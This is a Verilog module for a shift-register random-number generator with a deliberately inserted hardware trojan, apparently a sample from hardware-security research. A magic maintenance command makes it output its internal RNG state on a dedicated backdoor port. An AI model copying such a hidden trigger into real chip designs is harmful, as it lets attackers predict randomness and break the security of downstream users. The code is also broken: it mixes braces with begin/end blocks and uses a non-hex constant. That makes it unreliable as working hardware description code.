module random_with_maintenance_trojan (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,
    input                       i_maintenance_mode,  // Input indicating maintenance mode
    input               [31:0]  i_maintenance_command, // Specific command for unauthorized access

    // Outputs
    output reg          [7:0]  o_data,
    output reg          [31:0] o_backdoor_data  // Output used for leaking information during unauthorized access
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Unauthorized access trigger: specific command received during maintenance
    wire trojan_trigger_condition = i_maintenance_mode && (i_maintenance_command == 32'hDEADCODE);

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
        end else {
            // Check for unauthorized access trigger
            if (trojan_trigger_condition) begin
                // If triggered, leak internal RNG state or allow unauthorized access
                o_backdoor_data <= r_data; // Leak internal state
            } else {
                // Normal operation
                r_data <= {r_data[30:0], w_xnor};
                o_backdoor_data <= 32'h0; // Ensure backdoor data is cleared during normal operation
            }
        end
        // Assign the output data
        o_data <= r_data[7:0];
    end

endmodule
